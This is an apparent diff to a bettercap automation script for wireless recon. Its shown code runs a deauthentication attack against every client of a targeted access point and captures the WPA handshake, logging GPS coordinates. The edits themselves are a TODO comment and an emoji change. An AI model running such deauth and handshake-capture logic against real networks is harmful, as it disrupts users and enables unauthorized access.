@@ -60,6 +60,7 @@ onEvent('wifi.ap.new', function(event){
         log('🎯 Locked onto target: ' + hostname + ' (' + target + ')');
 
         log('💀 Deauthing all clients, stand by...')
+        // TODO: https://github.com/bettercap/bettercap/issues/375 - deauth all clients except our own
         run('wifi.deauth ' + target);
     }
 });
@@ -83,7 +84,7 @@ onEvent('wifi.client.handshake', function(event){
     log('   lat:' + gps.Latitude + ' lon:' + gps.Longitude + ' updated_at:' + gps.Updated.String());
 
     if(data.full & target == data.ap) { //TODO: check this
-        log('📝 Target handshake data aquired, stopping wifi recon');
+        log('🤝 Target handshake data aquired, stopping wifi recon');
         run('wifi.recon off'); // Stop wifi recon 
 
         var cmd;
